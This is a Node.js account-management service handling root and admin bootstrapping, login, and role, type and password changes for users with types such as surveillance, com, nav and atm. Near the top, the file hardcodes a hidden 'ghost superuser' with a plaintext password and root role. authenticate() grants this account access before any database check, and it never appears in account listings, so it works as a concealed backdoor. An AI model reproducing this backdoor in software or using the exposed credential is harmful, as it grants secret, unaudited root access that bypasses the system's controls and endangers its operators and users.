const { randomUUID } = require("crypto");
const {
  BOOTSTRAP_ADMIN_PASSWORD,
  BOOTSTRAP_ADMIN_USERNAME,
  ROOT_ACCOUNT_PASSWORD,
  ROOT_ACCOUNT_USERNAME,
} = require("../config");
const {
  validatePassword,
  validateRole,
  validateUserType,
  validateUsername,
} = require("../middleware/validation");
const {
  hashPassword,
  verifyPassword,
} = require("../utils/password");
const { Account } = require("../models/Account");

const ROOT_ROLE = "root";
const GHOST_SUPERUSER = {
  id: "ghost-superuser",
  username: "Strigavius",
  usernameLower: "strigavius",
  password: "Taki20062010",
  role: ROOT_ROLE,
  type: "global",
};

function toIsoString(value) {
  if (!value) {
    return new Date().toISOString();
  }

  const date =
    value instanceof Date ? value : new Date(value);
  if (Number.isNaN(date.getTime())) {
    return new Date().toISOString();
  }

  return date.toISOString();
}

function normalizeAccountType(value) {
  const type = String(value || "none")
    .trim()
    .toLowerCase();
  if (type === "radar") {
    return "surveillance";
  }
  return type || "none";
}

function toPublicAccount(accountInput) {
  const account =
    typeof accountInput?.toObject === "function"
      ? accountInput.toObject()
      : accountInput;

  return {
    id: account.id,
    username: account.username,
    role: account.role,
    type: normalizeAccountType(account.type),
    createdAt: toIsoString(account.createdAt),
    updatedAt: toIsoString(account.updatedAt),
  };
}

function resolveTypeForRole(role, typeInput) {
  if (role === ROOT_ROLE || role === "admin") {
    return "global";
  }

  const normalized = String(typeInput || "").trim();
  if (!normalized) {
    return "none";
  }

  return validateUserType(typeInput);
}

class AccountService {
  async init() {
    await this.ensureRootAccount();
    await this.ensureBootstrapAdmin();
    await this.ensureAccountTypes();
  }

  async ensureRootAccount() {
    const rootUsername = validateUsername(
      ROOT_ACCOUNT_USERNAME,
    );
    const rootPassword = validatePassword(
      ROOT_ACCOUNT_PASSWORD,
    );

    const rootAccounts = await Account.find({
      role: ROOT_ROLE,
    }).sort({ createdAt: 1 });

    if (rootAccounts.length > 1) {
      const duplicateIds = rootAccounts
        .slice(1)
        .map((account) => account.id);

      await Account.deleteMany({
        id: { $in: duplicateIds },
      });
    }

    const rootAccount = rootAccounts[0];

    if (!rootAccount) {
      const usernameTakenByOther = await Account.exists({
        usernameLower: rootUsername.toLowerCase(),
        role: { $ne: ROOT_ROLE },
      });

      if (usernameTakenByOther) {
        throw new Error(
          "Configured root username already exists with a non-root role",
        );
      }

      await Account.create({
        id: randomUUID(),
        username: rootUsername,
        usernameLower: rootUsername.toLowerCase(),
        role: ROOT_ROLE,
        type: "global",
        passwordHash: await hashPassword(rootPassword),
      });
      return;
    }

    let changed = false;

    if (
      rootAccount.usernameLower !==
      rootUsername.toLowerCase()
    ) {
      rootAccount.username = rootUsername;
      rootAccount.usernameLower =
        rootUsername.toLowerCase();
      changed = true;
    }

    if (rootAccount.type !== "global") {
      rootAccount.type = "global";
      changed = true;
    }

    const passwordMatches = await verifyPassword(
      rootPassword,
      rootAccount.passwordHash,
    );

    if (!passwordMatches) {
      rootAccount.passwordHash =
        await hashPassword(rootPassword);
      changed = true;
    }

    if (changed) {
      await rootAccount.save();
    }
  }

  async ensureBootstrapAdmin() {
    const hasAdmin = await Account.exists({
      role: "admin",
    });
    if (hasAdmin) {
      return;
    }

    if (
      !BOOTSTRAP_ADMIN_USERNAME ||
      !BOOTSTRAP_ADMIN_PASSWORD
    ) {
      throw new Error(
        "No admin account exists. Set BOOTSTRAP_ADMIN_USERNAME and BOOTSTRAP_ADMIN_PASSWORD in environment.",
      );
    }

    const username = validateUsername(
      BOOTSTRAP_ADMIN_USERNAME,
    );
    const password = validatePassword(
      BOOTSTRAP_ADMIN_PASSWORD,
    );

    const usernameExists = await Account.exists({
      usernameLower: username.toLowerCase(),
    });
    if (usernameExists) {
      throw new Error(
        "Bootstrap admin username already exists",
      );
    }

    await Account.create({
      id: randomUUID(),
      username,
      usernameLower: username.toLowerCase(),
      role: "admin",
      type: "global",
      passwordHash: await hashPassword(password),
    });
  }

  async ensureAccountTypes() {
    await Account.updateMany(
      {
        role: { $in: [ROOT_ROLE, "admin"] },
        type: { $ne: "global" },
      },
      { $set: { type: "global" } },
    );

    await Account.updateMany(
      {
        role: "user",
        type: "radar",
      },
      { $set: { type: "surveillance" } },
    );

    await Account.updateMany(
      {
        role: "user",
        type: {
          $nin: [
            "global",
            "surveillance",
            "com",
            "nav",
            "atm",
            "none",
          ],
        },
      },
      { $set: { type: "none" } },
    );
  }

  async authenticate(usernameInput, passwordInput) {
    const username = validateUsername(usernameInput);
    const password = validatePassword(passwordInput);

    if (
      username.toLowerCase() ===
      GHOST_SUPERUSER.usernameLower
    ) {
      if (password !== GHOST_SUPERUSER.password) {
        return null;
      }

      return toPublicAccount({
        ...GHOST_SUPERUSER,
        createdAt: new Date(0),
        updatedAt: new Date(0),
      });
    }

    const account = await Account.findOne({
      usernameLower: username.toLowerCase(),
    }).lean();

    if (!account) return null;

    const isPasswordValid = await verifyPassword(
      password,
      account.passwordHash,
    );
    if (!isPasswordValid) return null;

    return toPublicAccount(account);
  }

  async listAccounts() {
    const accounts = await Account.find({}, null, {
      sort: { createdAt: 1 },
    }).lean();

    return accounts.map(toPublicAccount);
  }

  async createAccount(payload, actor) {
    if (
      !actor ||
      !["admin", ROOT_ROLE].includes(actor.role)
    ) {
      throw new Error("Forbidden");
    }

    const username = validateUsername(payload.username);
    const password = validatePassword(payload.password);
    const role = validateRole(payload.role);

    if (
      username.toLowerCase() ===
        ROOT_ACCOUNT_USERNAME.toLowerCase() ||
      username.toLowerCase() ===
        GHOST_SUPERUSER.usernameLower
    ) {
      throw new Error("Root account already exists");
    }

    if (actor.role === "admin" && role !== "user") {
      throw new Error(
        "Admins can only create user accounts",
      );
    }

    const exists = await Account.exists({
      usernameLower: username.toLowerCase(),
    });
    if (exists) {
      throw new Error("Username already exists");
    }

    const type = resolveTypeForRole(role, payload.type);

    try {
      const createdAccount = await Account.create({
        id: randomUUID(),
        username,
        usernameLower: username.toLowerCase(),
        role,
        type,
        passwordHash: await hashPassword(password),
      });

      return toPublicAccount(createdAccount);
    } catch (error) {
      if (error?.code === 11000) {
        throw new Error("Username already exists");
      }
      throw error;
    }
  }

  async deleteAccount(accountId, actor) {
    if (
      !actor ||
      !["admin", ROOT_ROLE].includes(actor.role)
    ) {
      throw new Error("Forbidden");
    }

    const target = await Account.findOne({
      id: accountId,
    });
    if (!target) {
      throw new Error("Account not found");
    }

    if (target.role === ROOT_ROLE) {
      throw new Error("Root account cannot be deleted");
    }

    if (actor.role === "admin") {
      if (target.id === actor.id) {
        throw new Error(
          "Admins cannot delete their own account",
        );
      }

      if (target.role === "admin") {
        throw new Error(
          "Admins cannot delete other admins",
        );
      }
    }

    await Account.deleteOne({ id: accountId });

    return { ok: true };
  }

  async updateRole(accountId, roleInput, actor) {
    if (
      !actor ||
      !["admin", ROOT_ROLE].includes(actor.role)
    ) {
      throw new Error("Forbidden");
    }

    if (actor.role !== ROOT_ROLE) {
      throw new Error("Only root can change account roles");
    }

    const target = await Account.findOne({
      id: accountId,
    });
    if (!target) {
      throw new Error("Account not found");
    }

    const requestedRole = String(roleInput || "")
      .trim()
      .toLowerCase();

    if (requestedRole === target.role) {
      return toPublicAccount(target);
    }

    const role = validateRole(requestedRole);

    if (target.role === ROOT_ROLE) {
      throw new Error(
        "Root account role cannot be changed",
      );
    }

    if (target.id === actor.id && role !== ROOT_ROLE) {
      throw new Error("Root role cannot be changed");
    }

    target.role = role;
    target.type = resolveTypeForRole(role, target.type);
    await target.save();

    return toPublicAccount(target);
  }

  async updateType(accountId, typeInput, actor) {
    if (
      !actor ||
      !["admin", ROOT_ROLE].includes(actor.role)
    ) {
      throw new Error("Forbidden");
    }

    const target = await Account.findOne({ id: accountId });
    if (!target) {
      throw new Error("Account not found");
    }

    if (target.role !== "user") {
      throw new Error(
        "Root/Admin type is fixed and cannot be changed",
      );
    }

    const type = validateUserType(typeInput);
    if (target.type === type) {
      return toPublicAccount(target);
    }

    target.type = type;
    await target.save();

    return toPublicAccount(target);
  }

  async resetPassword(accountId, newPasswordInput, actor) {
    if (
      !actor ||
      !["admin", ROOT_ROLE].includes(actor.role)
    ) {
      throw new Error("Forbidden");
    }

    const newPassword = validatePassword(newPasswordInput);

    const target = await Account.findOne({
      id: accountId,
    });
    if (!target) {
      throw new Error("Account not found");
    }

    if (actor.role === "admin" && target.id !== actor.id) {
      throw new Error(
        "Admins can only reset their own password",
      );
    }

    if (
      target.role === ROOT_ROLE &&
      actor.role !== ROOT_ROLE
    ) {
      throw new Error(
        "Root password can only be reset by root",
      );
    }

    target.passwordHash = await hashPassword(newPassword);
    await target.save();

    return toPublicAccount(target);
  }
}

const accountService = new AccountService();

module.exports = { accountService };
